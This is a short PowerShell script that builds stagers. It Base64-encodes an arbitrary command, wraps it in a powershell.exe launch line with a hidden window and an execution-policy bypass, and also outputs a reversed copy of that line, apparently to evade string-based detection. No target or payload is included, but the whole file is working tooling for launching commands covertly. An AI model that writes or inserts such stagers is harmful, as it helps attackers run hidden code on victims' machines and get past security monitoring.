function Encode-Base64($command)
{
    $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
    return $enc
}


function Decode-Base64($enc)
{
    $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($enc))
    return $decode
}


function Reverse-String($string)
{
    $stringarray = $string -split ""
    [array]::Reverse($stringarray)
    $reversestring = $stringarray -join ''
    return $reversestring
}


function Generate-Stager($command)
{
    $base64command = Encode-Base64($command)
    $stager = "powershell.exe -windowstyle hidden -exec bypass -enc "  + $base64command
    $reversed_stager = Reverse-String($stager)

    Write-Host "[+] Command to stage:" -ForegroundColor DarkCyan
    Write-Host $command -Foregroundcolor Cyan
    Write-Host "[+] Stager:" -ForegroundColor DarkRed
    Write-Host $stager -ForegroundColor Red
    Write-Host "[+] Reversed Stager:" -ForegroundColor DarkGreen
    Write-Host $reversed_stager -ForegroundColor Green
}
